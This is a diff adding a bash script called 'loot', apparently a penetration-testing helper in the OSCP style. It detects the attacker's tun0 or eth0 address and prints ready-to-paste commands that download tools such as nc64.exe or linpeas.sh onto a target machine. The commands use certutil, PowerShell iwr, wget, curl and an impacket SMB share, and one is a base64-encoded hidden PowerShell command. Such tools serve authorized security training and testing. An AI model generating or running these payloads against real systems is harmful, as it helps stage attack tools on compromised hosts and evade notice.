@@ -1,0 +1,76 @@
+#!/bin/bash
+# Inspired by Miharada (Tiwa Ramdhani) [https://github.com/Miharada/MyOSCPTools/blob/main/TransferFileGenerator.py]
+
+RED='\033[31m'
+GREEN='\033[32m'
+BLUE='\033[34m'
+YELLOW='\033[33m'
+CYAN='\033[36m'
+NC='\033[0m'
+
+get_ip() {
+    local ip
+    ip=$(ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1)
+    [ -z "$ip" ] && ip=$(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1)
+    echo "$ip"
+}
+
+if [ "$#" -lt 2 ] || [ "$#" -gt 3 ]; then
+    echo -e "${RED}Usage: loot <file_name> <file_output> [port]${NC}"
+    echo -e "${RED}  Ex:  loot nc64.exe nc.exe 8080${NC}"
+    echo -e "${RED}  Ex:  loot linpeas.sh lp.sh${NC}"
+    echo -e "${RED}  Port default: 80${NC}"
+    exit 1
+fi
+
+file_name=$1
+file_output=$2
+port=${3:-80}
+
+lhost=$(get_ip)
+if [ -z "$lhost" ]; then
+    echo -e "${RED}Error: No IP found on tun0 or eth0${NC}"
+    exit 1
+fi
+
+base_url="http://$lhost:$port/$file_name"
+
+# Payloads
+certutil_payload="certutil -urlcache -split -f $base_url $file_output"
+iwr_payload="iwr -Uri $base_url -Outfile $file_output"
+iwr_encoded=$(echo -n "$iwr_payload" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
+wget_win_payload="wget $base_url -O $file_output"
+smb_payload="copy \\\\$lhost\\share\\$file_name $file_output"
+
+wget_payload="wget $base_url -O $file_output"
+curl_payload="curl $base_url -o $file_output"
+
+echo ""
+echo -e "${YELLOW}== Windows ==${NC}"
+echo -e "${CYAN}[certutil]${NC}"
+echo "$certutil_payload"
+echo ""
+echo -e "${CYAN}[iwr]${NC}"
+echo "$iwr_payload"
+echo ""
+echo -e "${CYAN}[iwr encoded]${NC}"
+echo "powershell -nop -w hidden -e $iwr_encoded"
+echo ""
+echo -e "${CYAN}[wget (PS)]${NC}"
+echo "$wget_win_payload"
+echo ""
+echo -e "${CYAN}[smb]${NC}"
+echo -e "${BLUE}  # 1. Attack machine — start SMB server:${NC}"
+echo "  impacket-smbserver share \$(pwd) -smb2support"
+echo -e "${BLUE}  # 2. Windows target — mount share (optional):${NC}"
+echo "  net use \\\\$lhost\\share"
+echo -e "${BLUE}  # 3. Windows target — copy file:${NC}"
+echo "  $smb_payload"
+
+echo ""
+echo -e "${YELLOW}== Linux ==${NC}"
+echo -e "${CYAN}[wget]${NC}"
+echo "$wget_payload"
+echo ""
+echo -e "${CYAN}[curl]${NC}"
+echo "$curl_payload"
